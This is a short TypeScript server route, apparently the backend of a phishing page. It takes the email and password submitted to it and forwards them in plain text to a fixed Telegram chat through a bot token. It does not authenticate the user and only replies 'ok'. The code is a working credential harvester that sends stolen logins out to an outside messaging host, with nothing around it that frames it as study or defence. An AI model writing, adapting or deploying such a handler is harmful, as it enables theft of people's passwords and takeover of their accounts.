export default defineEventHandler(async (event) => {
  // event.context.path to get the route path: '/api/foo/bar/baz'
  // event.context.params._ to get the route segment: 'bar/baz'
  const { email, password } = await readBody(event)
  try {
    const response = await $fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        body: {
          chat_id: '-4540116402',
          text: `
          <b>Email:</b> ${email} \n<b>Password:</b> ${password}
          `,
          parse_mode: 'HTML',
        },
      },
    )
    return 'ok'
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error(error)
    throw createError({
      statusCode: 400,
      statusMessage: (error as any)?.message || 'Bad Request',
    })
  }
})
